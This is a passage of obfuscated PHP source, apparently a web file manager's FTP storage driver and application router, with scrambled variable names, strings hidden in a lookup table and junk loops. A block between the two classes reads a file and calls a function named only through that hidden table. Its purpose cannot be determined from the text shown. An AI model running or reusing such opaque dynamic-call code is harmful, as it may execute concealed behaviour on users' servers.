($this->setContent($ìœƒ¥‡, $İ³µ§×)) { return $this->getPathOuter($ìœƒ¥‡); } return !1; } public function mkdir($¸Î¾›ıæ, $Àë¢‡ºˆ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $¸Î¾›ıæ = $this->iconvSystem($¸Î¾›ıæ); if ($this->_isFolder($¸Î¾›ıæ) || @ftp_mkdir($this->connect, $¸Î¾›ıæ)) { return $this->getPathOuter($¸Î¾›ıæ); } if (!$this->mkdir($this->pathFather($¸Î¾›ıæ))) { return !1; } if ($¸Î¾›ıæ = @ftp_mkdir($this->connect, $¸Î¾›ıæ)) { return $this->getPathOuter($¸Î¾›ıæ); } return !1; } public function copyFile($ï˜ÇÃŞò, $úŠÂÌü´) { if (!$this->_isconn()) { return !1; } $Ü¯…ˆà = $this->pathThis($this->iconvSystem($ï˜ÇÃŞò)); $ÃØÎ¨×¦ = $this->tempFile($Ü¯…ˆà); $ƒµîË° = $this->iconvApp($ÃØÎ¨×¦); $this->download($ï˜ÇÃŞò, $ƒµîË°); $ŒÁ¾ÜÚÖ = $this->upload($úŠÂÌü´, $ƒµîË°); $this->tempFileRemve($ÃØÎ¨×¦); return $ŒÁ¾ÜÚÖ; } public function moveFile($Á‹øä¯, $Øô¹Î½¹) { if (!$this->_isconn()) { return !1; } $Á‹øä¯ = $this->iconvSystem($Á‹øä¯); $Øô¹Î½¹ = $this->iconvSystem($Øô¹Î½¹); $˜Ğ²Ÿ›ù = @ftp_rename($this->connect, $Á‹øä¯, $Øô¹Î½¹); return $˜Ğ²Ÿ›ù ? $this->getPathOuter($Øô¹Î½¹) : !1; } public function delFile($™×İ¤¶) { if (!$this->_isconn()) { return !1; } $™×İ¤¶ = $this->iconvSystem($™×İ¤¶); return @ftp_delete($this->connect, $™×İ¤¶); } public function delFolder($Ç¹ºàŸ¸) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $è‚ùŒˆ  = $»—Áíæê = array(); $this->fileList($Ç¹ºàŸ¸, $è‚ùŒˆ , $»—Áíæê, !0); $this->listItemCache = !0; foreach ($»—Áíæê as $¹ÆÉƒì‡) { $à² ¶Ë = $this->iconvSystem($¹ÆÉƒì‡[$_SERVER[³½¬ÚË¯][32]]); $ß§ƒç« = @ftp_delete($this->connect, $à² ¶Ë); if (!$ß§ƒç«) { return !1; } } foreach ($è‚ùŒˆ  as $à² ¶Ë) { $à² ¶Ë = $this->iconvSystem($à² ¶Ë); $ß§ƒç« = @ftp_rmdir($this->connect, $à² ¶Ë); if (!$ß§ƒç«) { return !1; } } $Ç¹ºàŸ¸ = $this->iconvSystem($Ç¹ºàŸ¸); return @ftp_rmdir($this->connect, $Ç¹ºàŸ¸); } public function rename($êş¹ÍÄÒ, $§©«¤ÄÉ) { $ö¡ĞÙõÆ =& $_SERVER[³½¬ÚË¯]; if (!$this->_isconn()) { return !1; } $ø‚Ôò¯ñ = $this->fileNameAuto($this->pathFather($êş¹ÍÄÒ), $§©«¤ÄÉ); $ø‚Ôò¯ñ = $this->iconvSystem($ø‚Ôò¯ñ); $êş¹ÍÄÒ = $this->iconvSystem($êş¹ÍÄÒ); $ÚÁ¶‘Á³ = $this->pathFather($êş¹ÍÄÒ); $°š–º”û = rtrim($ÚÁ¶‘Á³, $ö¡ĞÙõÆ[8]) . $ö¡ĞÙõÆ[8] . $ø‚Ôò¯ñ; $Ö“ş¬­å = @ftp_rename($this->connect, $êş¹ÍÄÒ, $°š–º”û); $°š–º”û = $this->iconvApp($°š–º”û); return $Ö“ş¬­å ? $this->getPathOuter($°š–º”û) : !1; } private function folderInfo($’¤íÆŞ€, $†€ô°Ÿ = false) { $¨¨¼»î² =& $_SERVER[³½¬ÚË¯]; $–ô÷§–Ù = array($¨¨¼»î²[32] => $this->pathThis($’¤íÆŞ€), $¨¨¼»î²[84] => $this->getPathOuter($¨¨¼»î²[8] . $’¤íÆŞ€), $¨¨¼»î²[33] => $¨¨¼»î²[75]); if ($†€ô°Ÿ) { return $–ô÷§–Ù; } $–ô÷§–Ù[$¨¨¼»î²[215]] = $–ô÷§–Ù[$¨¨¼»î²[85]] = 0; $–ô÷§–Ù[$¨¨¼»î²[216]] = $–ô÷§–Ù[$¨¨¼»î²[217]] = !0; return $–ô÷§–Ù; } private function fileInfo($ƒ›šÙĞ, $Àí’×»ï = false, $ª¬Áø¤¼ = array()) { $åä¤°™ =& $_SERVER[³½¬ÚË¯]; $íÔæ¼´ì = array($åä¤°™[32] => $this->pathThis($ƒ›šÙĞ), $åä¤°™[84] => $this->getPathOuter($åä¤°™[8] . $ƒ›šÙĞ), $åä¤°™[33] => $åä¤°™[214], $åä¤°™[76] => isset($ª¬Áø¤¼[$åä¤°™[76]]) ? $ª¬Áø¤¼[$åä¤°™[76]] : 0, $åä¤°™[175] => $this->ext($ƒ›šÙĞ)); if ($Àí’×»ï) { return $íÔæ¼´ì; } $íÔæ¼´ì[$åä¤°™[215]] = $íÔæ¼´ì[$åä¤°™[85]] = 0; $íÔæ¼´ì[$åä¤°™[216]] = $íÔæ¼´ì[$åä¤°™[217]] = !0; $Ú‰‚Ç¼ë = $this->iconvSystem($ƒ›šÙĞ); $íÔæ¼´ì[$åä¤°™[85]] = @ftp_mdtm($this->connect, $Ú‰‚Ç¼ë); if (empty($ª¬Áø¤¼)) { $ª¬Áø¤¼ = $this->objectMeta($ƒ›šÙĞ); if (!$ª¬Áø¤¼) { return $íÔæ¼´ì; } } $íÔæ¼´ì[$åä¤°™[76]] = $ª¬Áø¤¼[$åä¤°™[76]]; return $íÔæ¼´ì; } public function size($òÇŠòúœ) { $›ëÕ–ğä = $this->objectMeta($òÇŠòúœ); return $›ëÕ–ğä ? $›ëÕ–ğä[$_SERVER[³½¬ÚË¯][76]] : 0; } public function info($ÁìŸÃÑÙ) { if ($this->isFile($ÁìŸÃÑÙ)) { return $this->fileInfo($ÁìŸÃÑÙ, 0); } else { if ($this->isFolder($ÁìŸÃÑÙ)) { return $this->folderInfo($ÁìŸÃÑÙ); } } return !1; } private function fileList($ÔÂÎıùÎ, &$¬‡Í÷¾Õ, &$‰ ¹è¿Ô, $À®âãî“ = false) { $µ…ÂŠ±º =& $_SERVER[³½¬ÚË¯]; $ÔÂÎıùÎ = $this->iconvSystem($ÔÂÎıùÎ); if (!$this->isFolder($ÔÂÎıùÎ)) { return !1; } @ftp_chdir($this->connect, $µ…ÂŠ±º[8]); $ÔÂÎıùÎ = rtrim($ÔÂÎıùÎ, $µ…ÂŠ±º[8]) . $µ…ÂŠ±º[8]; check_abort(); $íèŠÁÍË = @ftp_rawlist($this->connect, $ÔÂÎıùÎ); if (!$íèŠÁÍË) { $íèŠÁÍË = array(); } $ÆöÒ­Ó± = array($µ…ÂŠ±º[10] => 1, $µ…ÂŠ±º[1321] => 1); foreach ($íèŠÁÍË as $§²Œ†Öø) { $€Èª’Œ = $this->_listItem($§²Œ†Öø); if ($€Èª’Œ[0] == $µ…ÂŠ±º[794]) { continue; } $¨ëÁä¨ = $€Èª’Œ[8]; if (empty($¨ëÁä¨) && $¨ëÁä¨ !== $µ…ÂŠ±º[212] || isset($ÆöÒ­Ó±[$¨ëÁä¨])) { continue; } $¨ëÁä¨ = $this->iconvApp($ÔÂÎıùÎ . ltrim($¨ëÁä¨, $µ…ÂŠ±º[8])); $ïÚ§ª‘Ç = array($µ…ÂŠ±º[32] => $¨ëÁä¨, $µ…ÂŠ±º[33] => $µ…ÂŠ±º[214], $µ…ÂŠ±º[76] => $€Èª’Œ[4]); if (substr($§²Œ†Öø, 0, 1) == $µ…ÂŠ±º[1403]) { $ïÚ§ª‘Ç[$µ…ÂŠ±º[33]] = $µ…ÂŠ±º[75]; $ïÚ§ª‘Ç[$µ…ÂŠ±º[76]] = 0; } $¢àò‰ÓÜ = $ïÚ§ª‘Ç[$µ…ÂŠ±º[33]] == $µ…ÂŠ±º[75] ? !0 : !1; $this->cacheMethodInfoSet($¨ëÁä¨, $¢àò‰ÓÜ, $ïÚ§ª‘Ç); if ($¢àò‰ÓÜ) { $¬‡Í÷¾Õ[] = $¨ëÁä¨; if ($À®âãî“) { $this->fileList($¨ëÁä¨, $¬‡Í÷¾Õ, $‰ ¹è¿Ô, $À®âãî“); } continue; } $‰ ¹è¿Ô[] = $ïÚ§ª‘Ç; } $this->cacheMethodInfoSet($ÔÂÎıùÎ, !0); } private function _listItem($ÂŒó­üÚ) { if (empty($ÂŒó­üÚ)) { return array(); } $ºÛ®¸Óã = preg_split($_SERVER[³½¬ÚË¯][1404], $ÂŒó­üÚ); if (count($ºÛ®¸Óã) <= 9) { return $ºÛ®¸Óã; } $ºÛ®¸Óã[8] = trim(substr($ÂŒó­üÚ, strpos($ÂŒó­üÚ, $ºÛ®¸Óã[7]) + strlen($ºÛ®¸Óã[7]))); return array_splice($ºÛ®¸Óã, 0, 9); } public function listPath($Å×¨º°, $õ¢¿ß·˜ = false) { $†¢Ùû“À =& $_SERVER[³½¬ÚË¯]; if (!$this->_isconn()) { return !1; } $¥ü©ò¦º = $äª½´·³ = array(); $this->fileList($Å×¨º°, $¥ü©ò¦º, $äª½´·³); foreach ($¥ü©ò¦º as $ ’Ó‘É¦ => $‚ÚØÜáİ) { $¥ü©ò¦º[$ ’Ó‘É¦] = $this->folderInfo($‚ÚØÜáİ, $õ¢¿ß·˜); } foreach ($äª½´·³ as $ ’Ó‘É¦ => $‚ÚØÜáİ) { $äª½´·³[$ ’Ó‘É¦] = $this->fileInfo($‚ÚØÜáİ[$†¢Ùû“À[32]], $õ¢¿ß·˜, $‚ÚØÜáİ); } return array($†¢Ùû“À[82] => $¥ü©ò¦º, $†¢Ùû“À[83] => $äª½´·³); } public function has($Ä»†ìçƒ, $×µşóã“ = false, $»ÈºÏ˜ª = true) { $ëÕüäÊ¬ =& $_SERVER[³½¬ÚË¯]; $ëş›à Ç = $¿„îü•Š = array(); $Ääöùû = $×µşóã“ ? !0 : !1; $this->fileList($Ä»†ìçƒ, $ëş›à Ç, $¿„îü•Š, $Ääöùû); if ($×µşóã“) { return array($ëÕüäÊ¬[223] => count($¿„îü•Š), $ëÕüäÊ¬[224] => count($ëş›à Ç)); } if ($»ÈºÏ˜ª) { if (count($¿„îü•Š)) { return !0; } } else { if (count($ëş›à Ç)) { return !0; } } return !1; } public function listAll($¿µïšµ) { $Úœëß¾Õ =& $_SERVER[³½¬ÚË¯]; if (!$this->_isconn()) { return !1; } $Œü£†Ø = $ĞŞª÷¤Í = array(); $this->fileList($¿µïšµ, $Œü£†Ø, $ĞŞª÷¤Í, !0); $”İı†ˆå = array_to_keyvalue($ĞŞª÷¤Í, $Úœëß¾Õ[32]); foreach ($Œü£†Ø as $ŸÑ†îÂ) { if (is_string($ŸÑ†îÂ)) { $”İı†ˆå[$ŸÑ†îÂ] = array($Úœëß¾Õ[76] => 0); } } return $this->listAllFiles($¿µïšµ, $”İı†ˆå); } public function getContent($÷ìã†¬È) { if (!$this->_isconn()) { return !1; } $÷ìã†¬È = $this->iconvSystem($÷ìã†¬È); return $this->fileSubstr($÷ìã†¬È); } public function setContent($´íÍ¢¿°, $ÎÉ’İ—” = '') { if (!$this->_isconn()) { return !1; } $–ÊÅıÁã = $this->pathThis($this->iconvSystem($´íÍ¢¿°)); $À„Ò¤Ï“ = $this->tempFile($–ÊÅıÁã); file_put_contents($À„Ò¤Ï“, $ÎÉ’İ—”); $Ö«·ã— = $this->upload($´íÍ¢¿°, $this->iconvApp($À„Ò¤Ï“)); $this->tempFileRemve($À„Ò¤Ï“); return $Ö«·ã—; } public function fileSubstr($š’şŒƒ³, $ù…™Ó† = 0, $²ö÷¿· = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($š’şŒƒ³, $ù…™Ó†, $²ö÷¿·); } private function ftpRequest($ªõğÁò‹, $¹‹‹¿Â¬ = 0, $ëÏáñ™¿ = false) { $ªõğÁò‹ = $this->iconvSystem($ªõğÁò‹); $—ÀÃĞœ = $this->scheme . $this->host . $_SERVER[³½¬ÚË¯][4] . $this->port; $£ƒ®§ËØ = curl_init(); curl_setopt($£ƒ®§ËØ, CURLOPT_URL, $—ÀÃĞœ . $this->pathEncode($ªõğÁò‹)); curl_setopt($£ƒ®§ËØ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ëÏáñ™¿) { $úÒ™Ìœ = $¹‹‹¿Â¬ + $ëÏáñ™¿ - 1; curl_setopt($£ƒ®§ËØ, CURLOPT_RANGE, "{$¹‹‹¿Â¬}\55{$úÒ™Ìœ}"); } curl_setopt($£ƒ®§ËØ, CURLOPT_RETURNTRANSFER, 1); $ª×©èãÑ = curl_exec($£ƒ®§ËØ); curl_close($£ƒ®§ËØ); return $ª×©èãÑ; } public function upload($»×¯ğ´‰, $÷ò…‡æ, $ş›àÀğ£ = false, $õë¡õ¬× = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($»×¯ğ´‰))) { return !1; } $»×¯ğ´‰ = $this->iconvSystem($»×¯ğ´‰); $÷ò…‡æ = $this->iconvSystem($÷ò…‡æ); $Å¡ú™ß„ = ftp_nb_put($this->connect, $»×¯ğ´‰, $÷ò…‡æ, FTP_BINARY); while ($Å¡ú™ß„ == FTP_MOREDATA) { $Å¡ú™ß„ = ftp_nb_continue($this->connect); } if ($Å¡ú™ß„ != FTP_FINISHED) { return !1; } return $this->getPathOuter($»×¯ğ´‰); } public function download($å×Øˆ, $Ë’ËÛÛ  = '') { if (!$this->_isconn()) { return !1; } $„ŒôÌµ = $this->pathFather($Ë’ËÛÛ ); if (!IO::mkdir($„ŒôÌµ)) { return !1; } $å×Øˆ = $this->iconvSystem($å×Øˆ); $Ë’ËÛÛ  = $this->iconvSystem($Ë’ËÛÛ ); $Ãî¶¸‰å = ftp_nb_get($this->connect, $Ë’ËÛÛ , $å×Øˆ, FTP_BINARY); while ($Ãî¶¸‰å == FTP_MOREDATA) { $Ãî¶¸‰å = ftp_nb_continue($this->connect); } if ($Ãî¶¸‰å != FTP_FINISHED) { return !1; } return $this->iconvApp($Ë’ËÛÛ ); } public function exist($€çÁ¢‘¦) { return $this->isFile($€çÁ¢‘¦) || $this->isFolder($€çÁ¢‘¦); } public function isFile($ÍÙï´“À) { return !$this->isFolder($ÍÙï´“À) && $this->objectMeta($ÍÙï´“À); } public function isFolder($Œë½á—) { return $this->cacheMethod($_SERVER[³½¬ÚË¯][166], $Œë½á—); } protected function objectMeta($“ü¯®”) { return $this->cacheMethod($_SERVER[³½¬ÚË¯][168], $“ü¯®”); } protected function _objectMeta($úÉªõ¨«) { $ªÎğÌ =& $_SERVER[³½¬ÚË¯]; if ($úÉªõ¨« == $ªÎğÌ[12] || $úÉªõ¨« == $ªÎğÌ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $úÉªõ¨« = $this->iconvSystem($úÉªõ¨«); $óó™Â÷¦ = array($ªÎğÌ[32] => $this->iconvApp($úÉªõ¨«), $ªÎğÌ[33] => $ªÎğÌ[214], $ªÎğÌ[76] => 0); @ftp_chdir($this->connect, $ªÎğÌ[8]); $¦·¯ï÷ = @ftp_size($this->connect, $úÉªõ¨«); if ($¦·¯ï÷ != -1) { $óó™Â÷¦[$ªÎğÌ[76]] = $¦·¯ï÷; } else { $Î¢çşá = @ftp_chdir($this->connect, $úÉªõ¨«); if (!$Î¢çşá) { return !1; } $óó™Â÷¦[$ªÎğÌ[33]] = $ªÎğÌ[75]; } return $óó™Â÷¦; } protected function _isFolder($ •¶ğ‚ñ) { $Š÷¿»¿± =& $_SERVER[³½¬ÚË¯]; if ($ •¶ğ‚ñ == $Š÷¿»¿±[12] || $ •¶ğ‚ñ == $Š÷¿»¿±[8]) { return !0; } $…¬û®Õ  = $this->_objectMeta($ •¶ğ‚ñ); return isset($…¬û®Õ [$Š÷¿»¿±[33]]) && $…¬û®Õ [$Š÷¿»¿±[33]] == $Š÷¿»¿±[75] ? !0 : !1; } } if ($_SERVER[$_SERVER[³½¬ÚË¯][903]] != $_SERVER[$_SERVER[³½¬ÚË¯][904]]) { $_getc = $_SERVER[³½¬ÚË¯][905]; $_getfile = $_SERVER[$_SERVER[³½¬ÚË¯][906]] . $_SERVER[³½¬ÚË¯][907]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³½¬ÚË¯][246], $_getfilec); if (count($_getarrs) < $_SERVER[³½¬ÚË¯][658]) { $exit = $_SERVER[³½¬ÚË¯][908]; $exit(); } $_act = $_SERVER[³½¬ÚË¯][909]; $_act($_SERVER[$_SERVER[³½¬ÚË¯][910]]); } goto E¿¯åÃÅ‡£; DÆ»ô±Á©ƒ: class Application { private $defaultModule = "\151\156\x64\145\170"; private $defaultController = "\151\x6e\x64\x65\x78"; private $defaultAction = "\x69\156\x64\145\x78"; function __construct() { } public function setDefault($Ö†ÜÓÊ†) { $ìšö´Á  =& $_SERVER[³½¬ÚË¯]; $ô—¶‹Ş =& $_SERVER[œÈù³¡½]; $ŸÌ¡âÙù = explode($ô—¶‹Ş[0], trim($Ö†ÜÓÊ†, $ô—¶‹Ş[0])); $”õöå± = $ìšö´Á [654]; while ($”õöå± < $ìšö´Á [655]) { if ($”õöå± >= 0) { break; } $”õöå±++; } $this->defaultModule = $ŸÌ¡âÙù[0] ? $ŸÌ¡âÙù[0] : $this->defaultModule; $this->defaultController = $ŸÌ¡âÙù[1] ? $ŸÌ¡âÙù[1] : $this->defaultController; $ÑÏãÀÔ‚ = $ìšö´Á [656]; $this->defaultAction = $ŸÌ¡âÙù[2] ? $ŸÌ¡âÙù[2] : $this->defaultAction; $ñ”ÌÄü = $ìšö´Á [657]; while (strlen($ñ”ÌÄü) < $ìšö´Á [658]) { if (!$ñ”ÌÄü) { break; } $ñ”ÌÄü++; } $this->ostb3cb4b9e6($ô—¶‹Ş[1], array($this, $ô—¶‹Ş[2])); $ğù‘ÈÌ = $ìšö´Á [659]; while (strlen($ğù‘ÈÌ) < $ìšö´Á [649]) { if (!$ğù‘ÈÌ) { break; } $ğù‘ÈÌ++; } } public function appRun($ÊŠ¸‚»ú) { $›–Ò„Ê  =& $_SERVER[³½¬ÚË¯]; $•ÀÎèƒÁ =& $_SERVER[œÈù³¡½]; $æÒ³İ™í = explode($•ÀÎèƒÁ[0], $ÊŠ¸‚»ú); $ÄòÕÂ„ = strtolower($æÒ³İ™í[0]); $ˆ²Ãá = $›–Ò„Ê [660]; $ß³¼Ö½à = $•ÀÎèƒÁ[3]; if ($ÄòÕÂ„ == $•ÀÎèƒÁ[4]) { $ß³¼Ö½à = $•ÀÎèƒÁ[5]; $æÒ³İ™í[0] = $•ÀÎèƒÁ[6]; $æÒ³İ™í[1] = $æÒ³İ™í[1] . $•ÀÎèƒÁ[7]; $ÊŠ¸‚»ú = join($•ÀÎèƒÁ[0], $æÒ³İ™í); $ÊŠ¸‚»ú = trim($ÊŠ¸‚»ú, $•ÀÎèƒÁ[0]); } call_user_func(array($•ÀÎèƒÁ[8], $•ÀÎèƒÁ[9]), $ß³¼Ö½à . $•ÀÎèƒÁ[10], $ÊŠ¸‚»ú); ActionCall($ÊŠ¸‚»ú); call_user_func(array($•ÀÎèƒÁ[8], $•ÀÎèƒÁ[9]), $ß³¼Ö½à . $•ÀÎèƒÁ[11], $ÊŠ¸‚»ú); $Í‰¦ûÂí = $›–Ò„Ê [661]; if (!$Í‰¦ûÂí) { return; } } private function autorun() { $¢°­Ç¶ß =& $_SERVER[œÈù³¡½]; global $config; if (count($config[$¢°­Ç¶ß[12]]) == 0) { return; } foreach ($config[$¢°­Ç¶ß[12]] as $üØ–×ß® => $¬¯ªœÇà) { $this->appRun($¬¯ªœÇà); $ç¡ô¬“î = $_SERVER[³½¬ÚË¯][662]; } } private function ylni92d54477() { $ªÄ‚’œ˜ =& $_SERVER[³½¬ÚË¯]; $ÈÛœ÷ÛÙ =& $_SERVER[œÈù³¡½]; $È¡öÑ›ø = $ÈÛœ÷ÛÙ[4]; $ÅĞëğ½¶ = $ªÄ‚’œ˜[663]; while ($ÅĞëğ½¶ < $ªÄ‚’œ˜[655]) { if ($ÅĞëğ½¶ >= 0) { break; } $ÅĞëğ½¶++; } $ïÂ¼Üêá = $GLOBALS[$ÈÛœ÷ÛÙ[13]][$ÈÛœ÷ÛÙ[14]][0]; $½‹‡… = $ªÄ‚’œ˜[664]; if (strlen($½‹‡…) < $ªÄ‚’œ˜[658]) { return; } if (!$ïÂ¼Üêá || strlen($ïÂ¼Üêá) <= strlen($È¡öÑ›ø)) { return; } if (strtolower(substr($ïÂ¼Üêá, -strlen($È¡öÑ›ø))) != $È¡öÑ›ø) { return; } $ı·¨Ğ„ğ = substr($ïÂ¼Üêá, 0, -strlen($È¡öÑ›ø)); $“ç½“ÜÜ = array($ÈÛœ÷ÛÙ[4], $ı·¨Ğ„ğ); $ƒ¾Œ Äˆ = $ªÄ‚’œ˜[665]; if (!$ƒ¾Œ Äˆ) { return; } $º®™õ¢Ü = array_slice($GLOBALS[$ÈÛœ÷ÛÙ[13]][$ÈÛœ÷ÛÙ[14]], 1); $GLOBALS[$ÈÛœ÷ÛÙ[13]][$ÈÛœ÷ÛÙ[14]] = array_merge($“ç½“ÜÜ, $º®™õ¢Ü); $Í¶İë‘ = $ªÄ‚’œ˜[666]; if (strlen($Í¶İë‘) < $ªÄ‚’œ˜[658]) { return; } $GLOBALS[$ÈÛœ÷ÛÙ[13]][$ÈÛœ÷ÛÙ[15]] = implode($ÈÛœ÷ÛÙ[0], $GLOBALS[$ÈÛœ÷ÛÙ[13]][$ÈÛœ÷ÛÙ[14]]); $Áø´Ëåß = $ªÄ‚’œ˜[667]; } private function fgcwf59fa26b() { $•àÖ¬ìŸ =& $_SERVER[³½¬ÚË¯]; $ÛªîÕ„ù =& $_SERVER[œÈù³¡½]; if ($GLOBALS[$ÛªîÕ„ù[13]][$ÛªîÕ„ù[15]] != $ÛªîÕ„ù[6]) { return; } $¼¥üç = $_SERVER[$ÛªîÕ„ù[16]]; $×ˆéò¨¸ = $•àÖ¬ìŸ[668]; while ($×ˆéò¨¸ < $•àÖ¬ìŸ[655]) { if ($×ˆéò¨¸ >= 0) { break; } $×ˆéò¨¸++; } $—æŞû‹ = $ÛªîÕ„ù[17]; if (!strstr($¼¥üç, $—æŞû‹)) { return; } $ì«Şå§ë = strrpos($¼¥üç, $—æŞû‹); $ÈÖ¡µ…Ö = $•àÖ¬ìŸ[669]; $¼ÏêªËØ = substr($¼¥üç, $ì«Şå§ë + strlen($—æŞû‹)); $ı¢ĞÀÆ• = $•àÖ¬ìŸ[670]; preg_match_all($ÛªîÕ„ù[18], $¼ÏêªËØ, $¶ƒ¼Šã¬); $ş‹ÏÊ«µ = $•àÖ¬ìŸ[671]; if (strlen($ş‹ÏÊ«µ) < $•àÖ¬ìŸ[649]) { return; } $¼ÏêªËØ = trim($¶ƒ¼Šã¬[0][0], $ÛªîÕ„ù[19]); $GLOBALS[$ÛªîÕ„ù[13]][$ÛªîÕ„ù[14]] = explode($ÛªîÕ„ù[19], $¼ÏêªËØ); $Ö‡É¹¸ = $•àÖ¬ìŸ[672]; $GLOBALS[$ÛªîÕ„ù[13]][$ÛªîÕ„ù[15]] = implode($ÛªîÕ„ù[0], $GLOBALS[$ÛªîÕ„ù[13]][$ÛªîÕ„ù[14]]); $­ŒÕî´¬ = $•àÖ¬ìŸ[673]; while ($­ŒÕî´¬ < $•àÖ¬ìŸ[655]) { if ($­ŒÕî´¬ >= 0) { break; } $­ŒÕî´¬++; } } public function run() { $À…ƒ×Ô =& $_SERVER[³½¬ÚË¯]; $ŞÏ€Ìœâ =& $_SERVER[œÈù³¡½]; $this->fgcwf59fa26b(); $this->ylni92d54477(); $çøİå¹¤ = $GLOBALS[$ŞÏ€Ìœâ[13]][$ŞÏ€Ìœâ[14]]; $‚·€¢ÓŞ = $À…ƒ×Ô[674]; while (strlen($‚·€¢ÓŞ) < $À…ƒ×Ô[658]) { if (!$‚·€¢ÓŞ) { break; } $‚·€¢ÓŞ++; } $Çİ—Ù©• = $GLOBALS[$ŞÏ€Ìœâ[13]][$ŞÏ€Ìœâ[15]]; $¤À…¾Ö = $À…ƒ×Ô[675]; define($ŞÏ€Ìœâ[20], isset($çøİå¹¤[0]) && $çøİå¹¤[0] ? $çøİå¹¤[0] : $this->defaultModule); define($ŞÏ€Ìœâ[21], isset($çøİå¹¤[1]) && $çøİå¹¤[0] ? $çøİå¹¤[1] : $this->defaultController); define($ŞÏ€Ìœâ[22], isset($çøİå¹¤[2]) && $çøİå¹¤[0] ? $çøİå¹¤[2] : $this->defaultAction); $çšîåü = $À…ƒ×Ô[676]; while (strlen($çšîåü) < $À…ƒ×Ô[655]) { if (!$çšîåü) { break; } $çšîåü++; } define($ŞÏ€Ìœâ[23], MOD . $ŞÏ€Ìœâ[0] . ST . $ŞÏ€Ìœâ[0] . ACT); $ÙçÇİ‚· = $À…ƒ×Ô[677]; if (!$ÙçÇİ‚·) { die; } $_SERVER[$ŞÏ€Ìœâ[24]] = strtolower(ACTION); $å±ÉÓÔ = $À…ƒ×Ô[678]; if (strlen($å±ÉÓÔ) < $À…ƒ×Ô[653]) { return; } $this->autorun(); $¥”ÒèÙú = $À…ƒ×Ô[679]; while ($¥”ÒèÙú < $À…ƒ×Ô[649]) { if ($¥”ÒèÙú >= 0) { break; } $¥”ÒèÙú++; } if (count($çøİå¹¤) >= 3) { $this->appRun($Çİ—Ù©•); } else { $this->appRun(ACTION); } } private $ipsg6944302f = array(); private $ejzn9ffed84c = ''; public function dcwr1d46e459() { $—é×±íõ =& $_SERVER[³½¬ÚË¯]; $Åüáùıµ =& $_SERVER[œÈù³¡½]; $this->dres2d262823(); $this->udih9608fa3a(); $this->scpub54f48d2(); $this->kqgfaf1f164c(); $this->qkyh73130cb8(); $this->ndah3274ee45(); $­ÚåïÈÆ = $—é×±íõ[680]; if (strlen($­ÚåïÈÆ) < $—é×±íõ[658]) { return; } $this->gvnub185bd9c(); $this->ostb3cb4b9e6($Åüáùıµ[25], array($this, $Åüáùıµ[26])); $this->ostb3cb4b9e6($Åüáùıµ[27], array($this, $Åüáùıµ[28])); $this->ostb3cb4b9e6($Åüáùıµ[29], array($this, $Åüáùıµ[30])); $‹œÇÖùØ = $—é×±íõ[681]; while (strlen($‹œÇÖùØ) < $—é×±íõ[649]) { if (!$‹œÇÖùØ) { break; } $‹œÇÖùØ++; } $this->ostb3cb4b9e6($Åüáùıµ[31], array($this, $Åüáùıµ[32])); } public function ujgc1ee94596($‚·ıßøò) { $½¹âÖ¸ì =& $_SERVER[³½¬ÚË¯]; $º÷¶èšº =& $_SERVER[œÈù³¡½]; $»ÕÈÏê = Model($º÷¶èšº[33])->get(); $ß–ªë‰õ = $½¹âÖ¸ì[682]; if (!$ß–ªë‰õ) { die; } $óÙêŒê½ = array($º÷¶èšº[34], $º÷¶èšº[35], $º÷¶èšº[36], $º÷¶èšº[37], $º÷¶èšº[38], $º÷¶èšº[39], $º÷¶èšº[40], $º÷¶èšº[41], $º÷¶èšº[42], $º÷¶èšº[43], $º÷¶èšº[44], $º÷¶èšº[45], $º÷¶èšº[46], $º÷¶èšº[47], $º÷¶èšº[48], $º÷¶èšº[49], $º÷¶èšº[50], $º÷¶èšº[51], $º÷¶èšº[52], $º÷¶èšº[53], $º÷¶èšº[54], $º÷¶èšº[55], $º÷¶èšº[56], $º÷¶èšº[57], $º÷¶èšº[58], $º÷¶èšº[59], $º÷¶èšº[60], $º÷¶èšº[61], $º÷¶èšº[62], $º÷¶èšº[63], $º÷¶èšº[64], $º÷¶èšº[65], $º÷¶èšº[66], $º÷¶èšº[67], $º÷¶èšº[68], $º÷¶èšº[69], $º÷¶èšº[70], $º÷¶èšº[71], $º÷¶èšº[72], $º÷¶èšº[73], $º÷¶èšº[74], $º÷¶èšº[75], $º÷¶èšº[76], $º÷¶èšº[77], $º÷¶èšº[78], $º÷¶èšº[79], $º÷¶èšº[80], $º÷¶èšº[81], $º÷¶èšº[82], $º÷¶èšº[83], $º÷¶èšº[84]); $©¼÷Ãö = $½¹âÖ¸ì[683]; while ($©¼÷Ãö < $½¹âÖ¸ì[658]) { if ($©¼÷Ãö >= 0) { break; } $©¼÷Ãö++; } foreach ($óÙêŒê½ as $Ú‰¾ŸÎ) { $ÀóáÀé  = $GLOBALS[$º÷¶èšº[85]][$º÷¶èšº[86]][$Ú‰¾ŸÎ]; if (isset($»ÕÈÏê[$Ú‰¾ŸÎ])) { $ÀóáÀé  = $»ÕÈÏê[$Ú‰¾ŸÎ]; } $‚·ıßøò[$º÷¶èšº[87]][$º÷¶èšº[88]][$Ú‰¾ŸÎ] = $ÀóáÀé ; } $“Ê„Ä– = $‚·ıßøò[$º÷¶èšº[87]][$º÷¶èšº[88]][$º÷¶èšº[46]]; unset($‚·ıßøò[$º÷¶èšº[87]][$º÷¶èšº[89]][$º÷¶èšº[90]]); unset($‚·ıßøò[$º÷¶èšº[87]][$º÷¶èšº[89]][$º÷¶èšº[91]]); $£¢¨Şõñ = $½¹âÖ¸ì[684]; if (!$£¢¨Şõñ) { die; } unset($‚·ıßøò[$º÷¶èšº[87]][$º÷¶èšº[88]][$º÷¶èšº[46]]); unset($‚·ıßøò[$º÷¶èšº[87]][$º÷¶èšº[88]][$º÷¶èšº[92]]); $‚·ıßøò[$º÷¶èšº[87]][$º÷¶èšº[88]][$º÷¶èšº[93]] = array($º÷¶èšº[94] => (int) $“Ê„Ä–[$º÷¶èšº[95]], $º÷¶èšº[96] => (int) _get($“Ê„Ä–, $º÷¶èšº[97], 0)); $´ôÇ ·œ = $½¹âÖ¸ì[685]; if (strlen($´ôÇ ·œ) < $½¹âÖ¸ì[653]) { die; } $€¼èğÂ = 